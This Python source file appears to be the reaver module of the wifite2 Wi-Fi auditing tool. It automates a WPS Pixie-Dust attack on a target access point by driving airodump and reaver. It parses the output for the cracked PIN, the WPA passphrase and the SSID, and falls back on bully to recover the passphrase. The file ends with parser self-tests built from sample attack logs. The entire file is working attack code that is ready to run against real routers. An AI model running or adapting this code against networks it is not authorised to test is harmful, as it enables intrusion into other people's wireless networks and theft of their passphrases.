#!/usr/bin/python2.7
# -*- coding: utf-8 -*-

from .dependency import Dependency
from .airodump import Airodump
from .bully import Bully # for PSK retrieval
from ..model.attack import Attack
from ..config import Configuration
from ..util.color import Color
from ..util.process import Process
from ..util.timer import Timer
from ..model.wps_result import CrackResultWPS

import os, time, re

class Reaver(Attack, Dependency):
    dependency_required = False
    dependency_name = 'reaver'
    dependency_url = 'https://github.com/t6x/reaver-wps-fork-t6x'

    def __init__(self, target):
        super(Reaver, self).__init__(target)

        self.start_time = None
        self.state = 'Initializing'
        self.locked = False
        self.total_timeouts = 0
        self.total_wpsfails = 0

        self.crack_result = None

        self.output_filename = Configuration.temp('reaver.out')
        if os.path.exists(self.output_filename):
            os.remove(self.output_filename)

        self.output_write = open(self.output_filename, 'a')

        self.reaver_cmd = [
            'reaver',
            '--interface',  Configuration.interface,
            '--bssid',      self.target.bssid,
            '--channel',    self.target.channel,
            '--pixie-dust', '1',         # pixie-dust attack
            '--session',    '/dev/null', # Don't restart session
            '-vv'                        # (very) verbose
        ]

        self.reaver_proc = None

    def is_pixiedust_supported(self):
        ''' Checks if 'reaver' supports WPS Pixie-Dust attack '''
        output = Process(['reaver', '-h']).stderr()
        return '--pixie-dust' in output

    def run(self):
        ''' Returns True if attack is successful. '''
        try:
            self._run() # Run-loop
        except Exception as e:
            # Failed with error
            self.pattack('{R}Failed:{O} %s' % str(e), newline=True)
            return self.crack_result is not None

        # Stop reaver if it's still running
        if self.reaver_proc.poll() is None:
            self.reaver_proc.interrupt()

        # Clean up open file handle
        if self.output_write:
            self.output_write.close()

        return self.crack_result is not None


    def _run(self):
        self.start_time = time.time()

        with Airodump(channel=self.target.channel,
                      target_bssid=self.target.bssid,
                      skip_wps=True,
                      output_file_prefix='pixie') as airodump:

            # Wait for target
            self.pattack("Waiting for target to appear...")
            self.target = self.wait_for_target(airodump)

            # Start reaver
            self.reaver_proc = Process(self.reaver_cmd,
                    stdout=self.output_write,
                    stderr=Process.devnull())

            # Loop while reaver is running
            while self.crack_result is None and self.reaver_proc.poll() is None:

                # Refresh target information (power)
                self.target = self.wait_for_target(airodump)

                # Update based on reaver output
                stdout = self.get_output()
                self.state = self.parse_state(stdout)
                self.parse_failure(stdout)

                # Print status line
                self.pattack(self.get_status())

                # Check if we cracked it
                self.crack_result = self.parse_crack_result(stdout)

                time.sleep(0.5)

            # Check if crack result is in output
            stdout = self.get_output()
            self.crack_result = self.parse_crack_result(stdout)

            # Show any failures found
            if self.crack_result is None:
                self.parse_failure(stdout)

            if self.crack_result is None and self.reaver_proc.poll() is not None:
                raise Exception('Reaver process stopped (exit code: %s)' % self.reaver_proc.poll())


    def get_status(self):
        main_status = self.state

        meta_statuses = []
        if self.total_timeouts > 0:
            meta_statuses.append("{O}Timeouts:%d{W}" % self.total_timeouts)

        if self.total_wpsfails > 0:
            meta_statuses.append("{O}WPSFail:%d{W}" % self.total_wpsfails)

        if self.locked:
            meta_statuses.append("{R}Locked{W}")

        if len(meta_statuses) > 0:
            main_status += ' (%s)' % ', '.join(meta_statuses)

        return main_status


    def parse_crack_result(self, stdout):
        if self.crack_result is not None:
            return self.crack_result

        (pin, psk, ssid) = self.get_pin_psk_ssid(stdout)

        # Check if we cracked it, or if process stopped.
        if pin is not None:
            # We cracked it.

            if psk is not None:
                # Reaver provided PSK
                self.pattack('{G}Cracked WPS PIN: {C}%s{W} {G}PSK: {C}%s{W}' % (pin, psk), newline=True)
            else:
                self.pattack('{G}Cracked WPS PIN: {C}%s' % pin, newline=True)

                # Try to derive PSK from PIN using Bully
                self.pattack('{W}Retrieving PSK using {C}bully{W}...')
                psk = Bully.get_psk_from_pin(self.target, pin)
                if psk is None:
                    Color.pl("")
                    self.pattack('{R}Failed {O}to get PSK using bully', newline=True)
                else:
                    self.pattack('{G}Cracked WPS PSK: {C}%s' % psk, newline=True)

            crack_result = CrackResultWPS(self.target.bssid, ssid, pin, psk)
            crack_result.dump()
            return crack_result

        return None


    def parse_failure(self, stdout):
        # Total failure
        if 'WPS pin not found' in stdout:
            raise Exception('Reaver says "WPS pin not found"')

        # Running-time failure
        if self.running_time() > Configuration.wps_pixie_timeout:
            raise Exception('Timeout after %d seconds' % Configuration.wps_pixie_timeout)

        # WPSFail count
        self.total_wpsfails = stdout.count('WPS transaction failed')
        if self.total_wpsfails >= Configuration.wps_fail_threshold:
            raise Exception('Too many failures (%d)' % self.total_wpsfails)

        # Timeout count
        self.total_timeouts = stdout.count('Receive timeout occurred')
        if self.total_timeouts >= Configuration.wps_timeout_threshold:
            raise Exception('Too many timeouts (%d)' % self.total_timeouts)


    def parse_state(self, stdout):
        state = self.state

        stdout_last_line = stdout.split('\n')[-1]

        if 'Waiting for beacon from' in stdout_last_line:
            state = 'Waiting for beacon'

        elif 'Associated with' in stdout_last_line:
            state = 'Associated'

        elif 'Starting Cracking Session.' in stdout_last_line:
            state = 'Waiting to try PIN'

        elif 'Trying pin' in stdout_last_line:
            state = 'Trying PIN'

        elif 'Sending EAPOL START request' in stdout_last_line:
            state = 'Sending EAPOL Start request'

        elif 'Sending identity response' in stdout_last_line:
            state = 'Sending identity response'
            self.locked = False

        elif 'Sending M2 message' in stdout_last_line:
            state = 'Sending M2 / Running pixiewps'
            self.locked = False

        elif 'Detected AP rate limiting,' in stdout_last_line:
            state = 'Rate-Limited by AP'
            self.locked = True

        return state


    def pattack(self, message, newline=False):
        # Print message with attack information.
        time_left = Configuration.wps_pixie_timeout - self.running_time()

        Color.clear_entire_line()
        Color.pattack("WPS",
                self.target,
                'Pixie-Dust',
                '{W}[{C}%s{W}] %s' % (Timer.secs_to_str(time_left), message))
        if newline:
            Color.pl("")


    def running_time(self):
        return int(time.time() - self.start_time)


    @staticmethod
    def get_pin_psk_ssid(stdout):
        ''' Parses WPS PIN, PSK, and SSID from output '''
        pin = psk = ssid = None

        # Check for PIN.
        '''  [+] WPS pin:  11867722'''
        regex = re.search(r"WPS pin:\s*([0-9]*)", stdout, re.IGNORECASE)
        if regex:
            pin = regex.group(1)

        # Check for PSK.
        # Note: Reaver 1.6.x does not appear to return PSK (?)
        regex = re.search("WPA PSK: *'(.+)'", stdout)
        if regex:
            psk = regex.group(1)

        # Check for SSID
        """1.x [Reaver Test] [+] AP SSID: 'Test Router' """
        regex = re.search(r"AP SSID:\s*'(.*)'", stdout)
        if regex:
            ssid = regex.group(1)

        # Check (again) for SSID
        if ssid is None:
            """1.6.x [+] Associated with EC:1A:59:37:70:0E (ESSID: belkin.00e)"""
            regex = re.search(r"Associated with [0-9A-F:]+ \(ESSID: (.*)\)", stdout)
            if regex:
                ssid = regex.group(1)

        return (pin, psk, ssid)


    def get_output(self):
        ''' Gets output from reaver's output file '''
        if not self.output_filename:
            return ''

        if self.output_write:
            self.output_write.flush()

        with open(self.output_filename, 'r') as fid:
            stdout = fid.read()

        if Configuration.verbose > 1:
            Color.pe('\n{P} [reaver:stdout] %s' % '\n [reaver:stdout] '.join(stdout.split('\n')))

        return stdout.strip()


if __name__ == '__main__':
    old_stdout = '''
[Pixie-Dust]
[Pixie-Dust]   Pixiewps 1.1
[Pixie-Dust]
[Pixie-Dust]   [*] E-S1:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [*] E-S2:       00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:00
[Pixie-Dust]   [+] WPS pin:    12345678
[Pixie-Dust]
[Pixie-Dust]   [*] Time taken: 0 s
[Pixie-Dust]
Running reaver with the correct pin, wait ...
Cmd : reaver -i wlan0mon -b 08:86:3B:8C:FD:9C -c 11 -s y -vv -p 28097402

[Reaver Test] BSSID: AA:BB:CC:DD:EE:FF
[Reaver Test] Channel: 11
[Reaver Test] [+] WPS PIN: '12345678'
[Reaver Test] [+] WPA PSK: 'Test PSK'
[Reaver Test] [+] AP SSID: 'Test Router'
'''

    # From vom513 in https://github.com/derv82/wifite2/issues/60
    new_stdout = '''
[+] Switching wlan1mon to channel 5
[+] Waiting for beacon from EC:1A:59:37:70:0E
[+] Received beacon from EC:1A:59:37:70:0E
[+] Vendor: RealtekS
[+] Trying pin "12345670"
[+] Sending authentication request
[+] Sending association request
[+] Associated with EC:1A:59:37:70:0E (ESSID: belkin.00e)
[+] Sending EAPOL START request
[+] Received identity request
[+] Sending identity response
[+] Received M1 message
[+] Sending M2 message

 Pixiewps 1.4

 [?] Mode:     3 (RTL819x)
 [*] Seed N1:  -
 [*] Seed ES1: -
 [*] Seed ES2: -
 [*] PSK1:     2c2e33f5e3a870759f0aeebbd2792450
 [*] PSK2:     3f4ca4ea81b2e8d233a4b80f9d09805d
 [*] ES1:      04d48dc20ec785762ce1a21a50bc46c2
 [*] ES2:      04d48dc20ec785762ce1a21a50bc46c2
 [+] WPS pin:  11867722

 [*] Time taken: 0 s 21 ms

executing pixiewps -e d0141b15656e96b85fcead2e8e76330d2b1ac1576bb026e7a328c0e1baf8cf91664371174c08ee12ec92b0519c54879f21255be5a8770e1fa1880470ef423c90e34d7847a6fcb4924563d1af1db0c481ead9852c519bf1dd429c163951cf69181b132aea2a3684caf35bc54aca1b20c88bb3b7339ff7d56e09139d77f0ac58079097938251dbbe75e86715cc6b7c0ca945fa8dd8d661beb73b414032798dadee32b5dd61bf105f18d89217760b75c5d966a5a490472ceba9e3b4224f3d89fb2b -s 5a67001334e3e4cb236f4e134a4d3b48d625a648e991f978d9aca879469d5da5 -z c8a2ccc5fb6dc4f4d69b245091022dc7e998e42ec1d548d57c35a312ff63ef20 -a 60b59c0c587c6c44007f7081c3372489febbe810a97483f5cc5cd8463c3920de -n 04d48dc20ec785762ce1a21a50bc46c2 -r 7a191e22a7b519f40d3af21b93a21d4f837718b45063a8a69ac6d16c6e5203477c18036ca01e9e56d0322e70c2e1baa66518f1b46d01acc577d1dfa34efd2e9ee36e2b7e68819cddacceb596a8895243e33cb48c570458a539dcb523a4d4c4360e158c29b882f7f385821ea043705eb56538b45daa445157c84e60fc94ef48136eb4e9725b134902b96c90b1ae54cbd42b29b52611903fdae5aa88bfc320f173d2bbe31df4996ebdb51342c6b8bd4e82ae5aa80b2a09a8bf8faa9a8332dc9819
'''
    (pin, psk, ssid) = Reaver.get_pin_psk_ssid(old_stdout)
    assert pin  == '12345678',    'pin was "%s", should have been "12345678"' % pin
    assert psk  == 'Test PSK',    'psk was "%s", should have been "Test PSK"' % psk
    assert ssid == "Test Router", 'ssid was %s, should have been Test Router' % repr(ssid)
    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
    result.dump()

    print("")

    (pin, psk, ssid) = Reaver.get_pin_psk_ssid(new_stdout)
    assert pin  == '11867722',   'pin was "%s", should have been "11867722"' % pin
    assert psk  == None,         'psk was "%s", should have been "None"' % psk
    assert ssid == "belkin.00e", 'ssid was "%s", should have been "belkin.00e"' % repr(ssid)
    result = CrackResultWPS('AA:BB:CC:DD:EE:FF', ssid, pin, psk)
    result.dump()
